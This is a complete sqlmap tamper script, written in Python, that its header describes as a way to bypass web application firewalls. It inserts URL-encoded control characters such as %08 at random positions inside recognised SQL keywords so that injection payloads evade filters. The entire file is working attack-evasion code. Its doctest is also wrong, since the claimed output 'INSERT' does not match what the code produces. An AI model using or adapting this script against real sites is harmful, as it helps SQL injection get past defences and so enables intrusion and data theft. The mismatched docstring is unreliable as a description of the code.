#!/usr/bin/env python

"""
sqlmap tamper script for bypassing WAF
g4mm4 is my hero
"""
import re
import random
from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def g4mm4_inject_tab(_str):
    hash = _str
    hashlist = list(hash)
    _index = random.randint(1, len(_str)-1)
    hashlist.insert(_index, '%08')#%08, %00, %0B as well
    g4mm4 = ''.join(hashlist)
    return g4mm4

def tamper(payload, **kwargs):
    """
    Insert random back space position between each keyword character for bypassing WAF
    >>> tamper('insert')
    'INSERT'
    """

    retVal = payload

    if payload:
        for match in re.finditer(r"[A-Za-z_]+", retVal):
            word = match.group()

            if word.upper() in kb.keywords:
                retVal = retVal.replace(word, g4mm4_inject_tab(word))

    return retVal